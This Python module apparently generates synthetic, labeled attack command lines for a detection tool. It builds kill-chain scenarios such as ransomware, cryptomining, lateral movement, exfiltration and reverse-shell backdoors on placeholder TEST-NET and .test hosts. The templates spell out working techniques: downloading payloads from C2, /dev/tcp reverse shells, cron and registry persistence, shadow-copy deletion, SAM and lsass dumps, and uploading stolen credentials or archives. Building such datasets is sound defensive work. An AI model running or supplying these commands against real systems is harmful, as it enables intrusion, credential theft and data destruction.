"""Scenario knowledge: ATT&CK-style kill-chain scaffolds.

Each scenario is an ordered list of steps. A step maps to a kill-chain phase
and carries one or more realistic command templates per OS. Templates use
``{placeholder}`` fields that are filled from a deterministically-generated
context so output is reproducible for a given seed.

This module is the grounding for the LLM path *and* the engine for the
offline (``--no-llm``) fallback, so the tool can always produce a coherent
attack for any scenario the judges name.
"""

from __future__ import annotations

import random
from dataclasses import dataclass
from typing import Callable

# Canonical kill-chain phase order (used to keep generated chains coherent).
PHASE_ORDER = [
    "initial-access",
    "execution",
    "persistence",
    "privilege-escalation",
    "defense-evasion",
    "credential-access",
    "discovery",
    "lateral-movement",
    "collection",
    "command-and-control",
    "exfiltration",
    "impact",
]


@dataclass
class Step:
    phase: str
    rationale: str
    linux: list[tuple[str, str]]  # (process_name, command_line_template)
    windows: list[tuple[str, str]]


# --------------------------------------------------------------------------- #
# Deterministic context: paths, users, C2 endpoints, payload names, etc.
# Uses RFC 5737 TEST-NET ranges and .test domains so nothing is a real target.
# --------------------------------------------------------------------------- #

_LINUX_USERS = ["deploy", "svc-web", "jenkins", "ec2-user", "app", "ci-runner"]
_WIN_USERS = ["svc_sql", "jdoe", "backupadmin", "iisapp", "helpdesk"]
_INNOCUOUS = ["update", "cache", "systemd-private", "telemetry", "session", "sync-agent"]
_LIN_STAGING = ["/tmp/.cache", "/dev/shm/.font-unix", "/var/tmp/.ICE-unix", "/tmp/.X11-unix"]
_WIN_STAGING = [r"C:\Users\Public", r"C:\ProgramData\Microsoft\Crypto",
                r"%TEMP%", r"C:\Windows\Temp"]
_C2_DOMAINS = ["cdn-assets-{n}.test", "telemetry-{n}.test", "pkg-mirror-{n}.test",
               "updates-{n}.test", "metrics-{n}.test"]
_POOLS = ["pool.minexmr.test:4444", "xmr.pool-{n}.test:5555", "mine.crypto-{n}.test:3333"]


def make_context(seed: int) -> dict[str, str]:
    rng = random.Random(seed)
    luser = rng.choice(_LINUX_USERS)
    wuser = rng.choice(_WIN_USERS)
    name = rng.choice(_INNOCUOUS)
    lstage = rng.choice(_LIN_STAGING)
    wstage = rng.choice(_WIN_STAGING)
    n = rng.randint(100, 999)
    octet = rng.randint(2, 254)
    return {
        "luser": luser,
        "lhome": f"/home/{luser}",
        "lstage": lstage,
        "lpayload": f"{lstage}/.{name}",
        "lbin": f".{name}",
        "larchive": f"{lstage}/.{name}.tgz",
        "wuser": wuser,
        "wstage": wstage,
        "wpayload": f"{wstage}\\{name}.exe",
        "wbin": f"{name}.exe",
        "warchive": f"{wstage}\\{name}.zip",
        "ip": f"198.51.100.{octet}",
        "ip2": f"203.0.113.{octet}",
        "domain": rng.choice(_C2_DOMAINS).format(n=n),
        "port": str(rng.choice([443, 8080, 8443, 53, 4444])),
        "pool": rng.choice(_POOLS).format(n=n),
        "wallet": "4" + "".join(rng.choice("0123456789abcdef") for _ in range(31)),
    }


# --------------------------------------------------------------------------- #
# Shared low-signal "filler" steps. These are individually plausible but, in
# combination with the chain, are malicious (discovery / staging / evasion).
# Used to top a chain up to exactly 20 commands.
# --------------------------------------------------------------------------- #

FILLER = [
    Step("discovery", "Enumerate users and sudo rights to plan escalation.",
         [("bash", "getent passwd | awk -F: '$3>=1000{{print $1}}'"),
          ("sudo", "sudo -n -l 2>/dev/null")],
         [("powershell.exe", "powershell -nop -c \"Get-LocalUser | Select Name,Enabled\""),
          ("net.exe", "net localgroup administrators")]),
    Step("discovery", "Map the environment and running services quietly.",
         [("bash", "ps -eo user,pid,cmd --sort=-%cpu | head -n 25"),
          ("ss", "ss -tnp 2>/dev/null | head -n 40")],
         [("tasklist.exe", "tasklist /v /fo csv"),
          ("powershell.exe", "powershell -nop -c \"Get-Service | Where Status -eq Running\"")]),
    Step("defense-evasion", "Wipe shell history / logs to slow investigation.",
         [("bash", "unset HISTFILE; export HISTSIZE=0"),
          ("bash", "truncate -s0 {lhome}/.bash_history 2>/dev/null")],
         [("wevtutil.exe", "wevtutil cl Security"),
          ("powershell.exe", "powershell -nop -c \"Clear-EventLog -LogName Security\"")]),
    Step("collection", "Stage interesting files into the working directory.",
         [("bash", "find {lhome} -name '*.env' -o -name 'id_rsa' 2>/dev/null | head"),
          ("cp", "cp -r {lhome}/.ssh {lstage}/ 2>/dev/null")],
         [("powershell.exe", "powershell -nop -c \"Get-ChildItem -Recurse -Include *.kdbx,*.pem $env:USERPROFILE\""),
          ("robocopy.exe", "robocopy %USERPROFILE%\\.aws {wstage}\\a /E /NFL /NDL")]),
    Step("discovery", "Read cloud / app config for secrets and topology.",
         [("bash", "cat {lhome}/.aws/credentials 2>/dev/null"),
          ("env", "env | grep -iE 'token|secret|key' 2>/dev/null")],
         [("cmd.exe", "cmd /c set | findstr /I \"TOKEN SECRET KEY\""),
          ("type", "type %USERPROFILE%\\.aws\\credentials")]),
]


# --------------------------------------------------------------------------- #
# Scenario scaffolds. Each is a coherent beginning -> middle -> end chain.
# --------------------------------------------------------------------------- #

_RANSOMWARE = [
    Step("initial-access", "Operator opens a foothold via a malicious scheduled job / macro dropper.",
         [("bash", "curl -fsSL http://{ip}/setup.sh -o {lstage}/s.sh")],
         [("mshta.exe", "mshta http://{ip}/i.hta")]),
    Step("execution", "Run the downloaded stage-1 loader.",
         [("bash", "bash {lstage}/s.sh")],
         [("powershell.exe", "powershell -nop -w hidden -enc SQBFAFgAIAAoAG4AZQB3AC0Abwn")]),
    Step("persistence", "Install a cron/scheduled-task so the payload survives reboot.",
         [("crontab", "(crontab -l 2>/dev/null; echo '*/10 * * * * {lpayload}') | crontab -")],
         [("schtasks.exe", "schtasks /create /sc minute /mo 10 /tn UpdateSync /tr {wpayload} /f")]),
    Step("privilege-escalation", "Abuse a writable service / sudo path for root.",
         [("bash", "sudo install -m4755 {lpayload} /usr/local/bin/{lbin}")],
         [("reg.exe", "reg add HKLM\\System\\CurrentControlSet\\Services\\Upd /v ImagePath /d {wpayload} /f")]),
    Step("defense-evasion", "Disable AV / real-time protection before encryption.",
         [("systemctl", "systemctl stop clamav-daemon")],
         [("powershell.exe", "powershell -nop -c Set-MpPreference -DisableRealtimeMonitoring $true")]),
    Step("discovery", "Find file shares and document stores to maximize damage.",
         [("bash", "find / -type d -name 'shares' -o -name 'backups' 2>/dev/null")],
         [("net.exe", "net view /all")]),
    Step("defense-evasion", "Delete volume shadow copies / local backups so recovery fails.",
         [("rm", "rm -rf /var/backups/* /snapshots/* 2>/dev/null")],
         [("vssadmin.exe", "vssadmin delete shadows /all /quiet")]),
    Step("impact", "Encrypt the target files in place.",
         [("openssl", "openssl enc -aes-256-cbc -salt -in {lhome}/data -out {lhome}/data.enc -k {wallet}")],
         [("certutil.exe", "certutil -encode {wstage}\\docs {warchive}")]),
    Step("impact", "Drop the ransom note across user directories.",
         [("bash", "for d in /home/*; do cp {lstage}/NOTE.txt $d/READ_ME.txt; done")],
         [("cmd.exe", "cmd /c copy {wstage}\\NOTE.txt %PUBLIC%\\READ_ME.txt")]),
]

_CRYPTO_MINER = [
    Step("initial-access", "Pull the miner installer from C2 disguised as a package mirror.",
         [("wget", "wget -q http://{domain}/x -O {lpayload}")],
         [("certutil.exe", "certutil -urlcache -split -f http://{domain}/x {wpayload}")]),
    Step("defense-evasion", "Mark payload executable with an innocuous name.",
         [("chmod", "chmod +x {lpayload}")],
         [("attrib.exe", "attrib +h {wpayload}")]),
    Step("execution", "Launch the miner detached, throttled to avoid notice.",
         [("nohup", "nohup {lpayload} --max-cpu=50 -o {pool} -u {wallet} >/dev/null 2>&1 &")],
         [("powershell.exe", "powershell -nop -w hidden -c Start-Process {wpayload} -Args '-o {pool} -u {wallet}'")]),
    Step("persistence", "Add a systemd/scheduled unit so the miner restarts.",
         [("systemctl", "systemctl --user enable session-sync.service")],
         [("schtasks.exe", "schtasks /create /sc onlogon /tn SessionSync /tr {wpayload} /f")]),
    Step("defense-evasion", "Kill competing miners and hide the process.",
         [("pkill", "pkill -f 'xmrig|kdevtmpfsi' 2>/dev/null")],
         [("taskkill.exe", "taskkill /F /IM xmrig.exe")]),
    Step("discovery", "Check available cores to tune mining intensity.",
         [("nproc", "nproc --all")],
         [("wmic.exe", "wmic cpu get NumberOfCores")]),
    Step("command-and-control", "Beacon mining stats back to the pool proxy.",
         [("curl", "curl -s http://{domain}/r -d host=$(hostname)")],
         [("powershell.exe", "powershell -nop -c (iwr http://{domain}/r).Content")]),
]

_LATERAL = [
    Step("credential-access", "Harvest SSH keys / saved creds from the foothold host.",
         [("cp", "cp {lhome}/.ssh/id_rsa {lstage}/k")],
         [("reg.exe", "reg save HKLM\\SAM {wstage}\\sam.hiv")]),
    Step("discovery", "Enumerate reachable hosts to pivot to.",
         [("bash", "for h in 10.0.0.{{1..50}}; do timeout 1 bash -c \">/dev/tcp/$h/22\" 2>/dev/null && echo $h; done")],
         [("powershell.exe", "powershell -nop -c \"1..50|%{{Test-Connection -Count 1 -Quiet 10.0.0.$_}}\"")]),
    Step("credential-access", "Dump in-memory credentials for reuse.",
         [("bash", "cat /proc/$(pgrep -n sshd)/environ 2>/dev/null")],
         [("rundll32.exe", "rundll32 comsvcs.dll MiniDump 632 {wstage}\\l.dmp full")]),
    Step("lateral-movement", "Reuse the stolen key to log into the next host.",
         [("ssh", "ssh -i {lstage}/k -o StrictHostKeyChecking=no {luser}@{ip2} 'id'")],
         [("wmic.exe", "wmic /node:{ip2} process call create {wpayload}")]),
    Step("lateral-movement", "Copy the implant to the pivot host.",
         [("scp", "scp -i {lstage}/k {lpayload} {luser}@{ip2}:/tmp/.s")],
         [("cmd.exe", "cmd /c copy {wpayload} \\\\{ip2}\\C$\\Windows\\Temp\\s.exe")]),
    Step("execution", "Trigger the implant remotely.",
         [("ssh", "ssh -i {lstage}/k {luser}@{ip2} 'nohup /tmp/.s &'")],
         [("psexec.exe", "psexec \\\\{ip2} -d {wpayload}")]),
    Step("persistence", "Establish persistence on the new host.",
         [("crontab", "ssh -i {lstage}/k {luser}@{ip2} \"(crontab -l;echo '@reboot /tmp/.s')|crontab -\"")],
         [("schtasks.exe", "schtasks /s {ip2} /create /sc onstart /tn Sync /tr s.exe /f")]),
]

_EXFIL = [
    Step("discovery", "Locate sensitive data stores to collect.",
         [("find", "find /var /home -name '*.sql' -o -name '*.csv' 2>/dev/null | head")],
         [("powershell.exe", "powershell -nop -c \"gci -Rec -Include *.pst,*.xlsx C:\\Users\"")]),
    Step("collection", "Aggregate the target files into a staging directory.",
         [("cp", "cp -r /var/www/exports {lstage}/d")],
         [("robocopy.exe", "robocopy C:\\Finance {wstage}\\d /E /NFL /NDL")]),
    Step("collection", "Compress the staged data.",
         [("tar", "tar czf {larchive} {lstage}/d")],
         [("powershell.exe", "powershell -nop -c Compress-Archive {wstage}\\d {warchive}")]),
    Step("defense-evasion", "Encode/encrypt the archive to blend with normal traffic.",
         [("openssl", "openssl enc -aes-256-cbc -in {larchive} -out {larchive}.e -k {wallet}")],
         [("certutil.exe", "certutil -encode {warchive} {warchive}.b64")]),
    Step("command-and-control", "Split into chunks under the size that triggers DLP.",
         [("split", "split -b 4m {larchive}.e {lstage}/p_")],
         [("cmd.exe", "cmd /c copy /b {warchive}.b64 {wstage}\\p1")]),
    Step("exfiltration", "Upload the data to attacker infrastructure over HTTPS.",
         [("curl", "curl -s -F file=@{larchive}.e https://{domain}/u")],
         [("bitsadmin.exe", "bitsadmin /transfer j /upload https://{domain}/u {warchive}.b64")]),
    Step("exfiltration", "Tunnel a second copy out via DNS to evade web filters.",
         [("bash", "for c in $(base64 {lstage}/p_aa); do nslookup $c.{domain}; done")],
         [("nslookup.exe", "nslookup -type=TXT exfil.{domain}")]),
]

_PERSISTENCE = [
    Step("persistence", "Add a cron/scheduled task that re-launches the implant.",
         [("crontab", "(crontab -l 2>/dev/null; echo '*/5 * * * * {lpayload}') | crontab -")],
         [("schtasks.exe", "schtasks /create /sc minute /mo 5 /tn Telemetry /tr {wpayload} /f")]),
    Step("persistence", "Plant a login-shell / registry Run key backdoor.",
         [("bash", "echo '{lpayload} &' >> {lhome}/.bashrc")],
         [("reg.exe", "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Sync /d {wpayload} /f")]),
    Step("persistence", "Create a malicious systemd service / Windows service.",
         [("systemctl", "systemctl enable --now session-sync.service")],
         [("sc.exe", "sc create UpdSync binPath= {wpayload} start= auto")]),
    Step("defense-evasion", "Timestomp the payload to match system files.",
         [("touch", "touch -r /bin/ls {lpayload}")],
         [("powershell.exe", "powershell -nop -c \"(gi {wpayload}).LastWriteTime=(gi C:\\Windows\\notepad.exe).LastWriteTime\"")]),
    Step("persistence", "Backdoor an SSH authorized_keys / WMI subscription.",
         [("bash", "echo 'ssh-rsa AAAAB3...attacker' >> {lhome}/.ssh/authorized_keys")],
         [("powershell.exe", "powershell -nop -c \"Register-WmiEvent -Query 'SELECT * FROM Win32_LogonSession'\"")]),
]

_PRIVESC = [
    Step("discovery", "Hunt for SUID binaries / misconfigured services.",
         [("find", "find / -perm -4000 -type f 2>/dev/null")],
         [("powershell.exe", "powershell -nop -c \"Get-Acl 'C:\\Program Files' | fl\"")]),
    Step("privilege-escalation", "Exploit a writable cron/sudo entry to gain root.",
         [("bash", "echo '{luser} ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers.d/x")],
         [("reg.exe", "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /d cmd.exe /f")]),
    Step("privilege-escalation", "Hijack a library / service binary path.",
         [("cp", "cp {lpayload} /usr/lib/x86_64-linux-gnu/libreporthelper.so")],
         [("sc.exe", "sc config Spooler binPath= {wpayload}")]),
    Step("execution", "Run the escalated payload as root/SYSTEM.",
         [("sudo", "sudo {lpayload}")],
         [("schtasks.exe", "schtasks /create /ru SYSTEM /tn Esc /tr {wpayload} /f")]),
    Step("defense-evasion", "Remove the temporary escalation artifact.",
         [("rm", "rm -f /etc/sudoers.d/x")],
         [("reg.exe", "reg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /f")]),
]

_CRED = [
    Step("credential-access", "Read the system credential stores.",
         [("bash", "cp /etc/shadow {lstage}/.s 2>/dev/null")],
         [("reg.exe", "reg save HKLM\\SAM {wstage}\\sam && reg save HKLM\\SYSTEM {wstage}\\sys")]),
    Step("credential-access", "Dump credentials from process memory.",
         [("bash", "gcore -o {lstage}/m $(pgrep -n gnome-keyring) 2>/dev/null")],
         [("rundll32.exe", "rundll32 comsvcs.dll, MiniDump (Get-Process lsass).Id {wstage}\\l.dmp full")]),
    Step("credential-access", "Scrape config files and env for plaintext secrets.",
         [("grep", "grep -rIE 'password|api_key|secret' {lhome} /etc 2>/dev/null | head")],
         [("findstr.exe", "findstr /S /I /M \"password\" C:\\inetpub\\*.config")]),
    Step("collection", "Pull browser / keychain credential databases.",
         [("cp", "cp {lhome}/.mozilla/firefox/*/logins.json {lstage}/")],
         [("powershell.exe", "powershell -nop -c \"copy $env:APPDATA\\Mozilla\\Firefox\\Profiles\\*\\logins.json {wstage}\"")]),
    Step("exfiltration", "Send the harvested credentials to C2.",
         [("curl", "curl -s -F f=@{lstage}/.s https://{domain}/c")],
         [("certutil.exe", "certutil -encode {wstage}\\sam {wstage}\\sam.b64")]),
]

_BACKDOOR = [
    Step("initial-access", "Download a reverse-shell stager from C2.",
         [("curl", "curl -fsSL http://{ip}/sh -o {lpayload}")],
         [("certutil.exe", "certutil -urlcache -f http://{ip}/sh {wpayload}")]),
    Step("execution", "Open an interactive reverse shell to the operator.",
         [("bash", "bash -i >& /dev/tcp/{ip}/{port} 0>&1")],
         [("powershell.exe", "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{ip}',{port})\"")]),
    Step("persistence", "Ensure the shell reconnects on reboot.",
         [("crontab", "(crontab -l 2>/dev/null; echo '@reboot bash -i >& /dev/tcp/{ip}/{port} 0>&1') | crontab -")],
         [("schtasks.exe", "schtasks /create /sc onstart /tn NetSvc /tr {wpayload} /f")]),
    Step("defense-evasion", "Rename/hide the implant as a system process.",
         [("mv", "mv {lpayload} /usr/sbin/.{lbin}")],
         [("attrib.exe", "attrib +s +h {wpayload}")]),
    Step("command-and-control", "Maintain a keepalive beacon to C2.",
         [("bash", "while true; do curl -s http://{domain}/b; sleep 60; done &")],
         [("powershell.exe", "powershell -nop -w hidden -c \"while(1){{iwr http://{domain}/b;sleep 60}}\"")]),
]

_GENERIC = [
    Step("initial-access", "Establish a foothold by downloading a stager.",
         [("curl", "curl -fsSL http://{ip}/a -o {lpayload}")],
         [("certutil.exe", "certutil -urlcache -split -f http://{ip}/a {wpayload}")]),
    Step("execution", "Execute the dropped payload.",
         [("bash", "chmod +x {lpayload} && {lpayload} &")],
         [("powershell.exe", "powershell -nop -w hidden -File {wpayload}")]),
    Step("persistence", "Persist via a scheduled task.",
         [("crontab", "(crontab -l 2>/dev/null; echo '@reboot {lpayload}') | crontab -")],
         [("schtasks.exe", "schtasks /create /sc onstart /tn Sync /tr {wpayload} /f")]),
    Step("privilege-escalation", "Escalate privileges via a writable path.",
         [("sudo", "sudo cp {lpayload} /usr/local/bin/{lbin}")],
         [("reg.exe", "reg add HKLM\\System\\CurrentControlSet\\Services\\Svc /v ImagePath /d {wpayload} /f")]),
    Step("credential-access", "Harvest local credentials.",
         [("bash", "cp /etc/shadow {lstage}/.s 2>/dev/null")],
         [("reg.exe", "reg save HKLM\\SAM {wstage}\\sam")]),
    Step("collection", "Stage and compress data of interest.",
         [("tar", "tar czf {larchive} {lhome}/data")],
         [("powershell.exe", "powershell -nop -c Compress-Archive {wstage}\\d {warchive}")]),
    Step("exfiltration", "Exfiltrate over HTTPS to C2.",
         [("curl", "curl -s -F f=@{larchive} https://{domain}/u")],
         [("bitsadmin.exe", "bitsadmin /transfer j /upload https://{domain}/u {warchive}")]),
]

# Keyword -> scaffold. Matched case-insensitively against the scenario string.
SCENARIOS: dict[str, tuple[str, list[Step], list[str]]] = {
    "ransomware": ("File-encrypting ransomware: access, persist, kill backups, encrypt, ransom.",
                   _RANSOMWARE, ["ransom", "encrypt", "locker", "crypto-locker"]),
    "crypto-miner": ("Cryptojacking: drop a throttled miner, persist, and beacon to a pool.",
                     _CRYPTO_MINER, ["miner", "mining", "cryptojack", "xmrig", "monero", "coin"]),
    "lateral-movement": ("Lateral movement: steal creds, enumerate hosts, pivot, and persist.",
                         _LATERAL, ["lateral", "pivot", "spread", "worm", "movement"]),
    "data-exfiltration": ("Data exfiltration: collect, stage, encode, chunk, and smuggle out.",
                          _EXFIL, ["exfil", "exfiltration", "data theft", "steal data", "dlp"]),
    "persistence": ("Persistence: plant multiple footholds that survive reboot.",
                    _PERSISTENCE, ["persist", "backdoor key", "survive", "foothold"]),
    "privilege-escalation": ("Privilege escalation: find a misconfig and become root/SYSTEM.",
                             _PRIVESC, ["privilege", "privesc", "escalat", "root", "system access"]),
    "credential-access": ("Credential access: dump system, memory, and file-based secrets.",
                          _CRED, ["credential", "creds", "password dump", "lsass", "shadow", "mimikatz"]),
    "backdoor": ("Reverse-shell backdoor: stager, callback, persist, and beacon.",
                 _BACKDOOR, ["reverse shell", "reverse-shell", "c2", "command and control", "implant", "rat"]),
    "generic": ("Generic intrusion: access, execute, persist, escalate, collect, exfiltrate.",
                _GENERIC, []),
}


def match_scenario(name: str) -> str:
    """Map a free-text scenario to the closest scaffold key (fallback: generic)."""
    low = name.strip().lower()
    if low in SCENARIOS:
        return low
    for key, (_desc, _steps, keywords) in SCENARIOS.items():
        if key in low:
            return key
        for kw in keywords:
            if kw in low:
                return key
    return "generic"


def describe(scenario_key: str) -> str:
    return SCENARIOS[scenario_key][0]


def render_chain(scenario_key: str, os_name: str, ctx: dict[str, str],
                 seed: int, n: int = 20) -> list[dict]:
    """Render exactly ``n`` malicious command rows for the scenario + OS.

    Pads from the shared FILLER pool (with variation) when a scaffold has
    fewer than ``n`` steps; trims while preserving phase coverage otherwise.
    Each row: {process_name, command_line, label, phase, rationale}.
    """
    rng = random.Random(seed ^ 0x5EED)
    _desc, steps, _kw = SCENARIOS[scenario_key]
    pool: list[Step] = list(steps)

    # Top up to n using filler steps (rotated so we don't just repeat one).
    fi = 0
    while len(pool) < n:
        pool.append(FILLER[fi % len(FILLER)])
        fi += 1

    rows: list[dict] = []
    seen: set[str] = set()
    for step in pool:
        variants = step.linux if os_name == "linux" else step.windows
        variant = rng.choice(variants)
        proc, tmpl = variant
        cmd = tmpl.format(**ctx)
        # Ensure uniqueness; if a filler collides, append a benign-looking nonce.
        if cmd in seen:
            cmd = f"{cmd} # {rng.randint(1000, 9999)}"
        seen.add(cmd)
        rows.append({
            "process_name": proc,
            "command_line": cmd,
            "label": "malicious",
            "phase": step.phase,
            "rationale": step.rationale,
        })
        if len(rows) == n:
            break

    return rows
